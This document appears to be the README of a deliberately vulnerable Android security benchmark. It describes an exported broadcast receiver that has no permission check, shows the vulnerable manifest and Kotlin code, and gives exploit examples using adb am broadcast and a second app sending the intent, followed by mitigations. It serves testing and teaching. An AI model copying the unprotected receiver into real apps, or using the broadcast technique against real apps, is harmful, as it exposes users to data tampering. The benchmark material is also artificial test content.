# oxo-android-ben32 Critical broadcast receiver is not protected

This Android application benchmark, oxo-android-ben33, demonstrates a common security vulnerability where a broadcast receiver is exported without proper protection. This allows any other application on the device to send a broadcast intent to it, potentially leading to unauthorized data manipulation or a denial-of-service.

### Technical Details

The vulnerability lies in the `Receiver.kt` file and the AndroidManifest.xml.

- `AndroidManifest.xml`: The `<receiver>` component for the Receiver class is declared with `android:exported="true"`, making it accessible to other applications. Crucially, it does not specify a `permission` attribute to restrict who can send intents to it.

```
<receiver
    android:name=".Receiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.example.vulnerablereceiverapp.TRIGGER"/>
    </intent-filter>
</receiver>
```

- Receiver.kt: The onReceive() method processes incoming intents without any checks on the sender's origin or permissions. It directly uses data from the intent's extras ("message" and "amount") to perform a sensitive action:

- It writes the data to the app's SharedPreferences, simulating the storage of attacker-controlled data.

- It displays a Toast message with the received data, providing a visible confirmation of the attack.


```

// No origin checks, no permission checks, trusts all extras blindly
val msg = intent.getStringExtra("message") ?: "(no message)"
val amount = intent.getIntExtra("amount", 0)

// Simulate a sensitive action
val prefs = context.getSharedPreferences("secrets", Context.MODE_PRIVATE)
prefs.edit()
    .putString("last_incoming_message", msg)
    .putInt("last_amount", amount)
    .apply()
```

### Exploitation

A malicious app can exploit this vulnerability with a simple Broadcast intent. By knowing the vulnerable app's package name and the broadcast action, an attacker can send an intent with arbitrary data.


Example Attack via `adb shell`

You can exploit this vulnerability from a computer connected to the device via ADB (Android Debug Bridge) using the am broadcast command.


```
adb shell am broadcast \
    -a com.example.vulnerablereceiverapp.TRIGGER \
    -n com.example.vulnerablereceiverapp/.Receiver \
    --es message "Pwned from ADB" \
    --ei amount 1337
```

This command will send a broadcast intent to the vulnerable receiver, which will then display a toast message on the device's screen.

#### Example Attack Code (from another app)

A malicious app can also trigger this vulnerability programmatically:

```angular2html
val intent = Intent("com.example.vulnerablereceiverapp.TRIGGER")
intent.setPackage("com.example.vulnerablereceiverapp") // Target the vulnerable app
intent.putExtra("message", "!! I am an attacker !!")
intent.putExtra("amount", 1337)

context.sendBroadcast(intent)
```

This code, when executed by an external app, will trigger the Receiver in the vulnerable application, writing "!! I am an attacker !!" to its shared preferences and displaying a toast message to the user.


### Mitigations

To prevent this vulnerability, developers should:

- Restrict access with permissions: Define and require a custom permission for the broadcast receiver, and ensure only trusted components (or the app itself) have this permission.

- Set exported="false": If the broadcast receiver is only for internal use within the app, explicitly set android:exported="false" in the manifest.

- Validate the sender: In the onReceive() method, check the sender's identity using Context.checkCallingOrSelfPermission() or other secure validation methods.

By applying these mitigations, the broadcast receiver can be protected from unauthorized external access.